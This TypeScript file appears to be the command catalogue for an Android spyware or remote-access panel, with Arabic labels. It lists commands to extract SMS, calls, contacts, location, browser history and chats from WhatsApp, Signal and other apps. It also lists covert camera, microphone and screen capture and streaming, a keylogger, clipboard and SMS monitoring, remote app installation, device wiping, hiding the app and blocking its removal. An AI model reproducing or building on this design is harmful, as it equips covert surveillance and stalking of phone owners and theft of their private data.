export interface CommandDef {
  cmd: string
  name: string
  icon: string
  category: string
  // eslint-disable-next-line @typescript-eslint/no-explicit-any
  params?: Record<string, any>
  hasParams?: boolean
  paramFields?: ParamField[]
}

export interface ParamField {
  key: string
  label: string
  type: 'text' | 'number' | 'select'
  options?: { label: string; value: string | number }[]
  required?: boolean
  placeholder?: string
}

export interface CategoryDef {
  name: string
  icon: string
  color: string
  commands: Record<string, CommandDef>
}

export const CMD_CATEGORIES: Record<string, CategoryDef> = {
  data: {
    name: 'البيانات',
    icon: '📊',
    color: '#4CAF50',
    commands: {
      sms: { cmd: 'get_sms', name: 'الرسائل', icon: '💬', category: 'data' },
      calls: { cmd: 'get_calls', name: 'سجل المكالمات', icon: '📞', category: 'data' },
      contacts: { cmd: 'get_contacts', name: 'جهات الاتصال', icon: '👤', category: 'data' },
      location: { cmd: 'get_location', name: 'الموقع', icon: '📍', category: 'data' },
      notifications: { cmd: 'get_notifications', name: 'الإشعارات', icon: '🔔', category: 'data' },
      apps: { cmd: 'get_apps', name: 'التطبيقات', icon: '📱', category: 'data' },
      info: { cmd: 'get_info', name: 'معلومات الجهاز', icon: 'ℹ️', category: 'data' },
      battery: { cmd: 'get_battery', name: 'البطارية', icon: '🔋', category: 'data' },
      gallery: { cmd: 'get_gallery', name: 'المعرض', icon: '🖼️', category: 'data' },
      clipboard: { cmd: 'get_clipboard', name: 'الحافظة', icon: '📋', category: 'data' },
      all_data: { cmd: 'get_all', name: 'جميع البيانات', icon: '📦', category: 'data' },
      wifi_info: { cmd: 'get_wifi_info', name: 'معلومات WiFi', icon: '📶', category: 'data' },
      network_info: { cmd: 'get_network_info', name: 'معلومات الشبكة', icon: '🌐', category: 'data' },
      sim_info: { cmd: 'get_sim_info', name: 'معلومات SIM', icon: '📲', category: 'data' },
      storage_info: { cmd: 'get_storage_info', name: 'التخزين', icon: '💾', category: 'data' },
      installed_apps: { cmd: 'get_installed_apps', name: 'التطبيقات المثبتة', icon: '📱', category: 'data' },
      running_apps: { cmd: 'get_running_apps', name: 'التطبيقات النشطة', icon: '⚡', category: 'data' },
      calendar: { cmd: 'get_calendar', name: 'التقويم', icon: '📅', category: 'data' },
      browser_history: { cmd: 'get_browser_history', name: 'سجل المتصفح', icon: '🌍', category: 'data' },
      app_usage: { cmd: 'get_app_usage', name: 'وقت الشاشة', icon: '⏱️', category: 'data' },
    },
  },
  social: {
    name: 'وسائل التواصل',
    icon: '💬',
    color: '#25D366',
    commands: {
      whatsapp: { cmd: 'get_whatsapp', name: 'واتساب', icon: '💬', category: 'social' },
      telegram_app: { cmd: 'get_telegram', name: 'تيليجرام', icon: '✈️', category: 'social' },
      instagram: { cmd: 'get_instagram', name: 'انستغرام', icon: '📷', category: 'social' },
      messenger: { cmd: 'get_messenger', name: 'ماسنجر', icon: '💭', category: 'social' },
      snapchat: { cmd: 'get_snapchat', name: 'سناب شات', icon: '👻', category: 'social' },
      tiktok: { cmd: 'get_tiktok', name: 'تيك توك', icon: '🎵', category: 'social' },
      twitter: { cmd: 'get_twitter', name: 'تويتر', icon: '🐦', category: 'social' },
      viber: { cmd: 'get_viber', name: 'فايبر', icon: '📞', category: 'social' },
      signal: { cmd: 'get_signal', name: 'سيجنال', icon: '🔒', category: 'social' },
      facebook: { cmd: 'get_facebook', name: 'فيسبوك', icon: '👤', category: 'social' },
      youtube: { cmd: 'get_youtube', name: 'يوتيوب', icon: '▶️', category: 'social' },
    },
  },
  control: {
    name: 'التحكم',
    icon: '🎮',
    color: '#2196F3',
    commands: {
      ping: { cmd: 'ping', name: 'Ping', icon: '🏓', category: 'control' },
      vibrate: { cmd: 'vibrate', name: 'اهتزاز', icon: '📳', category: 'control' },
      ring: { cmd: 'ring', name: 'رنين', icon: '🔔', category: 'control' },
      screenshot: { cmd: 'screenshot', name: 'لقطة شاشة', icon: '📸', category: 'control' },
      front_camera: { cmd: 'front_camera', name: 'الكاميرا الأمامية', icon: '🤳', category: 'control' },
      back_camera: { cmd: 'back_camera', name: 'الكاميرا الخلفية', icon: '📷', category: 'control' },
      record_audio: { cmd: 'record_audio', name: 'تسجيل صوت', icon: '🎙️', category: 'control' },
      record_screen: { cmd: 'record_screen', name: 'تسجيل الشاشة', icon: '🎬', category: 'control' },
      lock_phone: { cmd: 'lock_phone', name: 'قفل الجهاز', icon: '🔒', category: 'control' },
      unlock_phone: { cmd: 'unlock_phone', name: 'فتح الجهاز', icon: '🔓', category: 'control' },
      reboot: { cmd: 'reboot', name: 'إعادة تشغيل', icon: '🔄', category: 'control' },
      shutdown: { cmd: 'shutdown', name: 'إيقاف التشغيل', icon: '⛔', category: 'control' },
      set_volume: {
        cmd: 'set_volume', name: 'التحكم بالصوت', icon: '🔊', category: 'control',
        hasParams: true,
        paramFields: [{ key: 'level', label: 'مستوى الصوت', type: 'number', placeholder: '0-100', required: true }],
      },
      set_brightness: {
        cmd: 'set_brightness', name: 'السطوع', icon: '☀️', category: 'control',
        hasParams: true,
        paramFields: [{ key: 'level', label: 'مستوى السطوع', type: 'number', placeholder: '0-255', required: true }],
      },
      enable_wifi: { cmd: 'enable_wifi', name: 'تشغيل WiFi', icon: '📶', category: 'control' },
      disable_wifi: { cmd: 'disable_wifi', name: 'إيقاف WiFi', icon: '📵', category: 'control' },
      enable_bluetooth: { cmd: 'enable_bluetooth', name: 'تشغيل بلوتوث', icon: '🔵', category: 'control' },
      disable_bluetooth: { cmd: 'disable_bluetooth', name: 'إيقاف بلوتوث', icon: '❌', category: 'control' },
      enable_mobile_data: { cmd: 'enable_mobile_data', name: 'تشغيل البيانات', icon: '📱', category: 'control' },
      disable_mobile_data: { cmd: 'disable_mobile_data', name: 'إيقاف البيانات', icon: '📵', category: 'control' },
      enable_hotspot: { cmd: 'enable_hotspot', name: 'تشغيل الهوت سبوت', icon: '📡', category: 'control' },
      disable_hotspot: { cmd: 'disable_hotspot', name: 'إيقاف الهوت سبوت', icon: '📵', category: 'control' },
      airplane_on: { cmd: 'airplane_on', name: 'وضع الطيران', icon: '✈️', category: 'control' },
      airplane_off: { cmd: 'airplane_off', name: 'إلغاء الطيران', icon: '🛬', category: 'control' },
      torch_on: { cmd: 'torch_on', name: 'تشغيل الفلاش', icon: '🔦', category: 'control' },
      torch_off: { cmd: 'torch_off', name: 'إيقاف الفلاش', icon: '🔦', category: 'control' },
      play_sound: { cmd: 'play_sound', name: 'تشغيل صوت', icon: '🔊', category: 'control' },
      speak_text: {
        cmd: 'speak_text', name: 'نطق نص', icon: '🗣️', category: 'control',
        hasParams: true,
        paramFields: [{ key: 'text', label: 'النص', type: 'text', placeholder: 'أدخل النص', required: true }],
      },
      show_notification: {
        cmd: 'show_notification', name: 'إظهار إشعار', icon: '🔔', category: 'control',
        hasParams: true,
        paramFields: [
          { key: 'title', label: 'العنوان', type: 'text', placeholder: 'عنوان الإشعار', required: true },
          { key: 'text', label: 'النص', type: 'text', placeholder: 'نص الإشعار', required: true },
        ],
      },
      open_url: {
        cmd: 'open_url', name: 'فتح رابط', icon: '🔗', category: 'control',
        hasParams: true,
        paramFields: [{ key: 'url', label: 'الرابط', type: 'text', placeholder: 'https://', required: true }],
      },
      send_sms: {
        cmd: 'send_sms', name: 'إرسال رسالة', icon: '💬', category: 'control',
        hasParams: true,
        paramFields: [
          { key: 'number', label: 'الرقم', type: 'text', placeholder: 'رقم الهاتف', required: true },
          { key: 'message', label: 'الرسالة', type: 'text', placeholder: 'نص الرسالة', required: true },
        ],
      },
      make_call: {
        cmd: 'make_call', name: 'إجراء مكالمة', icon: '📞', category: 'control',
        hasParams: true,
        paramFields: [{ key: 'number', label: 'الرقم', type: 'text', placeholder: 'رقم الهاتف', required: true }],
      },
    },
  },
  apps: {
    name: 'التطبيقات',
    icon: '📱',
    color: '#FF9800',
    commands: {
      open_app: {
        cmd: 'open_app', name: 'فتح تطبيق', icon: '📱', category: 'apps',
        hasParams: true,
        paramFields: [{ key: 'package', label: 'اسم الحزمة', type: 'text', placeholder: 'com.example.app', required: true }],
      },
      close_app: {
        cmd: 'close_app', name: 'إغلاق تطبيق', icon: '❌', category: 'apps',
        hasParams: true,
        paramFields: [{ key: 'package', label: 'اسم الحزمة', type: 'text', placeholder: 'com.example.app', required: true }],
      },
      install_app: {
        cmd: 'install_app', name: 'تثبيت تطبيق', icon: '⬇️', category: 'apps',
        hasParams: true,
        paramFields: [{ key: 'url', label: 'رابط APK', type: 'text', placeholder: 'رابط التثبيت', required: true }],
      },
      uninstall_app: {
        cmd: 'uninstall_app', name: 'حذف تطبيق', icon: '🗑️', category: 'apps',
        hasParams: true,
        paramFields: [{ key: 'package', label: 'اسم الحزمة', type: 'text', placeholder: 'com.example.app', required: true }],
      },
      block_app: {
        cmd: 'block_app', name: 'حظر تطبيق', icon: '🚫', category: 'apps',
        hasParams: true,
        paramFields: [{ key: 'package', label: 'اسم الحزمة', type: 'text', placeholder: 'com.example.app', required: true }],
      },
      unblock_app: {
        cmd: 'unblock_app', name: 'إلغاء حظر', icon: '✅', category: 'apps',
        hasParams: true,
        paramFields: [{ key: 'package', label: 'اسم الحزمة', type: 'text', placeholder: 'com.example.app', required: true }],
      },
      clear_app_data: {
        cmd: 'clear_app_data', name: 'مسح بيانات', icon: '🧹', category: 'apps',
        hasParams: true,
        paramFields: [{ key: 'package', label: 'اسم الحزمة', type: 'text', placeholder: 'com.example.app', required: true }],
      },
      force_stop_app: {
        cmd: 'force_stop_app', name: 'إيقاف قسري', icon: '⛔', category: 'apps',
        hasParams: true,
        paramFields: [{ key: 'package', label: 'اسم الحزمة', type: 'text', placeholder: 'com.example.app', required: true }],
      },
    },
  },
  files: {
    name: 'الملفات',
    icon: '📂',
    color: '#9C27B0',
    commands: {
      list_files: {
        cmd: 'list_files', name: 'عرض الملفات', icon: '📁', category: 'files',
        hasParams: true,
        paramFields: [{ key: 'path', label: 'المسار', type: 'text', placeholder: '/storage/emulated/0/', required: false }],
      },
      list_downloads: { cmd: 'list_files', name: 'التنزيلات', icon: '📥', category: 'files', params: { path: '/storage/emulated/0/Download' } },
      list_dcim: { cmd: 'list_files', name: 'الكاميرا', icon: '📷', category: 'files', params: { path: '/storage/emulated/0/DCIM' } },
      list_music: { cmd: 'list_files', name: 'الموسيقى', icon: '🎵', category: 'files', params: { path: '/storage/emulated/0/Music' } },
      list_videos: { cmd: 'list_files', name: 'الفيديوهات', icon: '🎬', category: 'files', params: { path: '/storage/emulated/0/Videos' } },
      list_documents: { cmd: 'list_files', name: 'المستندات', icon: '📄', category: 'files', params: { path: '/storage/emulated/0/Documents' } },
      list_whatsapp: { cmd: 'list_files', name: 'واتساب ملفات', icon: '💬', category: 'files', params: { path: '/storage/emulated/0/WhatsApp' } },
      list_telegram_files: { cmd: 'list_files', name: 'تيليجرام ملفات', icon: '✈️', category: 'files', params: { path: '/storage/emulated/0/Telegram' } },
      recent_files: { cmd: 'recent_files', name: 'أحدث الملفات', icon: '🕐', category: 'files' },
      search_files: {
        cmd: 'search_files', name: 'بحث ملفات', icon: '🔍', category: 'files',
        hasParams: true,
        paramFields: [{ key: 'query', label: 'اسم الملف', type: 'text', placeholder: 'ابحث عن ملف...', required: true }],
      },
      get_file: {
        cmd: 'get_file', name: 'تحميل ملف', icon: '⬇️', category: 'files',
        hasParams: true,
        paramFields: [{ key: 'path', label: 'مسار الملف', type: 'text', placeholder: '/storage/emulated/0/...', required: true }],
      },
      delete_file: {
        cmd: 'delete_file', name: 'حذف ملف', icon: '🗑️', category: 'files',
        hasParams: true,
        paramFields: [{ key: 'path', label: 'مسار الملف', type: 'text', placeholder: '/storage/emulated/0/...', required: true }],
      },
      send_full_backup: { cmd: 'send_backup_all', name: 'نسخ احتياطي كامل', icon: '💾', category: 'files' },
    },
  },
  security: {
    name: 'الأمان',
    icon: '🔒',
    color: '#F44336',
    commands: {
      wipe_data: { cmd: 'wipe_data', name: 'مسح البيانات', icon: '💣', category: 'security' },
      factory_reset: { cmd: 'factory_reset', name: 'إعادة تعيين المصنع', icon: '⚠️', category: 'security' },
      show_app: { cmd: 'show_app', name: 'إظهار التطبيق', icon: '👁️', category: 'security' },
      hide_app: { cmd: 'hide_app', name: 'إخفاء التطبيق', icon: '🙈', category: 'security' },
      change_passcode: {
        cmd: 'change_passcode', name: 'تغيير رمز PIN', icon: '🔑', category: 'security',
        hasParams: true,
        paramFields: [
          { key: 'old_pin', label: 'الرمز الحالي', type: 'text', placeholder: 'الرمز القديم', required: true },
          { key: 'new_pin', label: 'الرمز الجديد', type: 'text', placeholder: 'الرمز الجديد', required: true },
        ],
      },
      enable_biometric: { cmd: 'enable_biometric', name: 'تشغيل البصمة', icon: '☝️', category: 'security' },
      disable_biometric: { cmd: 'disable_biometric', name: 'إيقاف البصمة', icon: '🚫', category: 'security' },
      anti_uninstall_on: { cmd: 'anti_uninstall_on', name: 'حماية الحذف', icon: '🛡️', category: 'security' },
      anti_uninstall_off: { cmd: 'anti_uninstall_off', name: 'إلغاء الحماية', icon: '❌', category: 'security' },
      device_admin_status: { cmd: 'device_admin_status', name: 'حالة المسؤول', icon: '👑', category: 'security' },
      check_root: { cmd: 'get_info', name: 'فحص الروت', icon: '🔍', category: 'security', params: { check_root: true } },
    },
  },
  monitor: {
    name: 'المراقبة',
    icon: '🔍',
    color: '#00BCD4',
    commands: {
      keylogger_start: { cmd: 'keylogger_start', name: 'بدء تسجيل المفاتيح', icon: '⌨️', category: 'monitor' },
      keylogger_stop: { cmd: 'keylogger_stop', name: 'إيقاف تسجيل المفاتيح', icon: '⏹️', category: 'monitor' },
      get_keylogger: { cmd: 'get_keylogger', name: 'عرض السجل', icon: '📋', category: 'monitor' },
      screen_record_start: { cmd: 'screen_record_start', name: 'بدء تسجيل الشاشة', icon: '🎬', category: 'monitor' },
      screen_record_stop: { cmd: 'stop_screen', name: 'إيقاف التسجيل', icon: '⏹️', category: 'monitor' },
      location_live: { cmd: 'location_live', name: 'تتبع مباشر', icon: '📍', category: 'monitor' },
      location_stop: { cmd: 'location_stop', name: 'إيقاف التتبع', icon: '⛔', category: 'monitor' },
      clipboard_monitor_start: { cmd: 'clipboard_monitor_start', name: 'مراقبة الحافظة', icon: '📋', category: 'monitor' },
      clipboard_monitor_stop: { cmd: 'clipboard_monitor_stop', name: 'إيقاف مراقبة الحافظة', icon: '⏹️', category: 'monitor' },
      sms_monitor: { cmd: 'sms_monitor', name: 'مراقبة الرسائل', icon: '💬', category: 'monitor' },
      call_monitor: { cmd: 'call_monitor', name: 'مراقبة المكالمات', icon: '📞', category: 'monitor' },
    },
  },
  streaming: {
    name: 'البث المباشر',
    icon: '📡',
    color: '#E91E63',
    commands: {
      start_screen_stream: {
        cmd: 'start_screen_stream', name: 'بث الشاشة', icon: '🖥️', category: 'streaming',
        hasParams: true,
        paramFields: [{
          key: 'quality', label: 'الجودة', type: 'select', required: false,
          options: [
            { label: '480p', value: '480p' },
            { label: '720p', value: '720p' },
            { label: '1080p', value: '1080p' },
          ],
        }],
      },
      stop_screen_stream: { cmd: 'stop_screen_stream', name: 'إيقاف بث الشاشة', icon: '⏹️', category: 'streaming' },
      start_camera_stream: { cmd: 'start_camera_stream', name: 'بث الكاميرا', icon: '📷', category: 'streaming' },
      stop_camera_stream: { cmd: 'stop_camera_stream', name: 'إيقاف بث الكاميرا', icon: '⏹️', category: 'streaming' },
      start_audio_stream: { cmd: 'start_audio_stream', name: 'بث الصوت', icon: '🎙️', category: 'streaming' },
      stop_audio_stream: { cmd: 'stop_audio_stream', name: 'إيقاف بث الصوت', icon: '⏹️', category: 'streaming' },
      switch_camera: { cmd: 'switch_camera', name: 'تبديل الكاميرا', icon: '🔄', category: 'streaming' },
      set_stream_quality: {
        cmd: 'set_stream_quality', name: 'جودة البث', icon: '⚙️', category: 'streaming',
        hasParams: true,
        paramFields: [{
          key: 'quality', label: 'الجودة', type: 'select', required: true,
          options: [
            { label: '480p', value: '480p' },
            { label: '720p', value: '720p' },
            { label: '1080p', value: '1080p' },
            { label: '1440p', value: '1440p' },
          ],
        }],
      },
      stop_all_streams: { cmd: 'stop_all_streams', name: 'إيقاف كل البث', icon: '⛔', category: 'streaming' },
    },
  },
}